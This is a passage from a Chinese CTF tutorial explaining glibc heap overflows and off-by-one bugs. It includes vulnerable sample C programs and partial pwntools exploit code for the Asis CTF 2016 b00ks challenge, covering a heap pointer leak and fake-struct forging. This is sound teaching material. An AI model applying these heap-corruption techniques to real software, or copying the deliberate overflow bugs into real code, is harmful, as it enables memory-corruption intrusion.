class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序的主要目的是调用 <code>malloc</code> 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk  的区域并覆盖到其后的 top chunk 之中 (实际上 puts 内部会调用 <code>malloc</code> 分配堆内存，覆盖到的可能并不是 top  chunk)。 </p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;===chunk</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;===top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>print ‘A’*100 进行写入 </p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;===chunk</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x4141414141414141 &lt;===top chunk(已被溢出)</span><br><span class="line">0x602030:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602040:   0x4141414141414141  0x4141414141414141</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><h6 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h6><p>通常来说堆是通过调用<code> glibc</code> 函数<code>malloc</code> 进行分配的，在某些情况下会使用 <code>calloc</code> 分配。<code>calloc</code> 与<code>malloc</code>的区别是 <strong><code>calloc</code> 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的。</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><p>除此之外，还有一种分配是经由 <code>realloc </code>进行的，<code>realloc</code> 函数可以身兼<code> malloc</code> 和<code> free</code> 两个函数的功能。 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *chunk,*chunk1;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">  chunk1=<span class="built_in">realloc</span>(chunk,<span class="number">32</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时<ul><li>如果申请 size &gt; 原来 size<ul><li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</li></ul></li><li>如果申请 size &lt; 原来 size<ul><li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li><li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li></ul></li></ul></li><li>当 <code>realloc(ptr,size) </code>的 size 等于 0 时，相当于 <code>free(ptr)</code></li><li>当 <code>realloc(ptr,size)</code> 的 size 等于 <code>ptr</code> 的 size，不进行任何操作</li></ul><h6 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h6><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。</p><p>常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li><code>scanf</code></li><li><code>vscanf</code></li></ul></li><li>输出<ul><li><code>sprintf</code></li></ul></li><li>字符串<ul><li><code>strcpy</code>，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li><code>strcat</code>，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li><code>bcopy</code></li></ul></li></ul><h6 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h6><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。 一个常见的误区是 <code>malloc</code>  的参数等于实际分配堆块的大小，但是事实上<code>ptmalloc</code>分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8  个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，<code>malloc</code> 会直接返回 2 倍字长的块也就是最小 chunk，比如  64 位系统执行<code>malloc(0)</code>会返回用户区域为 16 字节的块。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//根据系统的位数，malloc会分配8或16字节的用户空间</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>注意用户区域的大小不等于 <code>chunk_head.size</code>，<code>chunk_head.size </code>&#x3D; 用户区域大小 + 2 * 字长</p><p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的 <code>prev_size</code> 字段储存内容。回头再来看下之前的示例代码 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察如上代码，我们申请的 chunk 大小是 24 个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 16 个字节而不是 24 个。 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1</span><br></pre></td></tr></table></figure><p> 16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 <code>pre_size</code> 域。我们可来看一下用户申请的内存大小与 <code>glibc </code>中实际分配的内存大小之间的转换。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* pad request bytes into a usable size -- internal version */</span><br><span class="line">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="line">#define request2size(req)                                                      \</span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure><p>当 <code>req=24</code> 时，<code>request2size(24)=32</code>。而除去 chunk 头部的 16  个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的<code>pre_size </code>仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 <code>prev_size</code> 字段，正好 24 个字节。<strong>实际上 <code>ptmalloc </code>分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。</strong></p><h4 id="堆中的-Off-By-One"><a href="#堆中的-Off-By-One" class="headerlink" title="堆中的 Off-By-One"></a>堆中的 Off-By-One</h4><h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 <code>ptmalloc </code>验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。  此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、<code>bss</code> 段等等，但是堆上（heap based） 的  off-by-one 是 <code>CTF</code> 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p><h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 <code>0x100</code> 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li></ol><p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* consolidate backward */</span><br><span class="line">    if (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">      /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */</span><br><span class="line">      if (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h6 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">my_gets</span><span class="params">(<span class="type">char</span> *ptr,<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用 <code>gdb </code>对程序进行调试，在进行输入前可以看到分配的两个用户区域为 16 字节的堆块 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p> 当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print ‘A’*17 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h6 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。 但是 strlen 和 strcpy  的行为不一致却导致了 off-by-one 的发生。 strlen 是我们很熟悉的计算 ascii  字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk</span><br></pre></td></tr></table></figure><p>在我们输入’A’*24 后执行 strcpy</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400</span><br></pre></td></tr></table></figure><p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖，这种又属于  off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte  off-by-one 在利用上的区别。 还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个  <code>DWORD </code>值在使用小端法的内存中是这样储存的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DWORD 0x41424344</span><br><span class="line">内存  0x44,0x43,0x42,0x41</span><br></pre></td></tr></table></figure><h6 id="在-libc-2-29-之后"><a href="#在-libc-2-29-之后" class="headerlink" title="在 libc-2.29 之后"></a>在 <code>libc-2.29 </code>之后</h6><p>由于这两行代码的加入 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">  malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</span><br></pre></td></tr></table></figure><p> 由于我们难以控制一个真实 chunk 的 size 字段，所以传统的 off-by-null 方法失效。但是，只需要满足被 unlink 的 chunk 和下一个 chunk 相连，所以仍然可以伪造 fake_chunk。</p><p>伪造的方式就是使用 large bin 遗留的 <code>fd_nextsiz</code>e 和 <code>bk_nextsize </code>指针。以 <code>fd_nextsize </code>为 fake_chunk 的<code> fd，bk_nextsize</code> 为 fake_chunk 的 bk，这样我们可以完全控制该 fake_chunk 的 size  字段（这个过程会破坏原 large bin chunk 的 fd 指针，但是没有关系），同时还可以控制其 <code>fd</code>（通过部分覆写  <code>fd_nextsize</code>）。通过在后面使用其他的 chunk 辅助伪造，可以通过该检测</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">  malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</span><br></pre></td></tr></table></figure><p>然后只需要通过 unlink 的检测就可以了，也就是 <code>fd-&gt;bk == p &amp;&amp; bk-&gt;fd == p</code></p><p>如果 large bin 中仅有一个 chunk，那么该 chunk 的两个 nextsize 指针都会指向自己，如下</p><p><img src="https://gitee.com/gery5sa/images/raw/master/largebin-struct.png" alt="img"></p><p>我们可以控制 <code>fd_nextsize</code> 指向堆上的任意地址，可以容易地使之指向一个<code> fastbin + 0x10 - 0x18</code>，而 <code>fastbin</code> 中的 <code>fd</code> 也会指向堆上的一个地址，通过部分覆写该指针也可以使该指针指向之前的<code> large bin + 0x10</code>，这样就可以通过 <code>fd-&gt;bk == p</code> 的检测。</p><p>由于 <code>bk_nextsize </code>我们无法修改，所以 <code>bk-&gt;fd </code>必然在原先的 large bin chunk 的<code>fd</code>指针处（这个 <code>fd</code>  被我们破坏了）。通过 <code>fastbin </code>的链表特性可以做到修改这个指针且不影响其他的数据，再部分覆写之就可以通过 <code>bk-&gt;fd==p</code> 的检测了。</p><p>然后通过 off-by-one 向低地址合并就可以实现 chunk overlapping 了，之后可以 leak libc_base 和 堆地址，tcache 打 __free_hook 即可。</p><p>光讲原理比较难理解，建议结合题目学习，比如本文中的实例 3。</p><h6 id="实例-1-Asis-CTF-2016-b00ks"><a href="#实例-1-Asis-CTF-2016-b00ks" class="headerlink" title="实例 1: Asis CTF 2016 b00ks"></a>实例 1: <code>Asis CTF 2016 b00ks</code></h6><p>程序是一个图书管理系统</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br></pre></td></tr></table></figure><p>程序保护如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>给出结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">char</span> *description;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create</p><p>book 结构中存在 name 和 description ， name 和 description 在堆上分配。首先分配 name buffer ，使用 <code>malloc </code>，大小自定但小于 32 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;\nEnter book name size: &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">printf(&quot;Enter book name (Max 32 chars): &quot;);</span><br><span class="line">ptr = malloc(v1);</span><br></pre></td></tr></table></figure><p>之后分配 description ，同样大小自定但无限制。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;\nEnter book description size: &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  v5 = malloc(v1);</span><br></pre></td></tr></table></figure><p>之后分配book结构的内存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">book = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( book )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)book + <span class="number">6</span>) = size;</span><br><span class="line">    *((_QWORD *)off_202010 + v2) = book;</span><br><span class="line">    *((_QWORD *)book + <span class="number">2</span>) = description;</span><br><span class="line">    *((_QWORD *)book + <span class="number">1</span>) = name;</span><br><span class="line">    *(_DWORD *)book = ++unk_202024;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">my_read</span><span class="params">(_BYTE *ptr, <span class="type">int</span> number)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( number &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  buf = ptr;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == number )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用</p><p>我们看到author存放位置</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//author</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_9F5(off_202018, <span class="number">32LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>);</span><br><span class="line"><span class="comment">//book指针</span></span><br><span class="line">*((_QWORD *)off_202010 + v2) = v3;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241010170317341.png" alt="image-20241010170317341"></p><p>可以看到他们是相邻的</p><p>因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 <code>&#39;\x00&#39;</code>  是写入到<code> 0x555555756060</code> 的位置的。这样当 <code>0x555555756060～0x555555756068</code> 写入 book  指针时就会覆盖掉结束符<code> &#39;\x00&#39;</code> ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer  array 中第一项的值。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x555555756040</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555756050</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span>   &lt;== author name</span><br><span class="line"><span class="number">0x555555756060</span>: <span class="number">0x0000555555757480</span> &lt;== pointer <span class="built_in">array</span>    <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756070</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756080</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>为了实现泄漏，首先在 author name 中需要输入 32 个字节来使得结束符被覆盖掉。之后我们创建 <code>book1</code> ，这个 <code>book1 </code> 的指针会覆盖 author name 中最后的 NULL 字节，使得该指针与 author name 直接连接，这样输出 author name 则可以获取到一个堆指针。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name_size,name,des_size,des</span>):</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>) <span class="comment"># create book1</span></span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars):&#x27;</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description size:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(des_size))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter book description:&#x27;</span>)</span><br><span class="line">io.sendline(des)</span><br><span class="line"><span class="comment">#duan()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>) <span class="comment"># print book1</span></span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">32</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Author:&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>) <span class="comment"># &lt;== leak book1</span></span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = book1_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">book1_addr = u64(book1_addr)</span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,book1_addr)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">off_by_one</span><span class="params">(addr)</span>:</span><br><span class="line">    addr += <span class="number">58</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)<span class="meta"># create fake book in description</span></span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    fake_book_data = p64(<span class="number">0x1</span>) + p64(addr) + p64(addr) + pack(<span class="number">0xffff</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Enter new book description:&#x27;</span>)</span><br><span class="line">    io.sendline(fake_book_data) # &lt;== fake book</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>) <span class="meta"># change author name</span></span><br><span class="line">    io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Enter author name:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>) # &lt;== off-by-one</span><br></pre></td></tr></table></figure><p>这里在 description 中伪造了 book ，使用的数据是 <code>p64(0x1)+p64(addr)+p64(addr)+pack(0xffff)</code> 。 其中 <code>addr+58</code> 是为了使指针指向 <code>book2 </code>的指针地址，使得我们可以任意修改这些指针值。</p><p>通过前面 2 部分我们已经获得了任意地址读写的能力，读者读到这里可能会觉得下面的操作是显而易见的，比如写 got 表劫持流程或者写  __malloc_hook 劫持流程等。但是这个题目特殊之处在于开启 PIE 并且没有泄漏 libc  基地址的方法，因此我们还需要想一下其他的办法。</p><p>这道题的巧妙之处在于在分配第二个 book 时，使用一个很大的尺寸，使得堆以 mmap 模式进行拓展。我们知道堆有两种拓展方式一种是 brk 会直接拓展原来的堆，另一种是 mmap 会单独映射一块内存。</p><p>在这里我们申请一个超大的块，来使用 mmap 扩展内存。因为 mmap 分配的内存与 libc 之前存在固定的偏移因此可以推算出 libc 的基地址。 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x0000000000401000 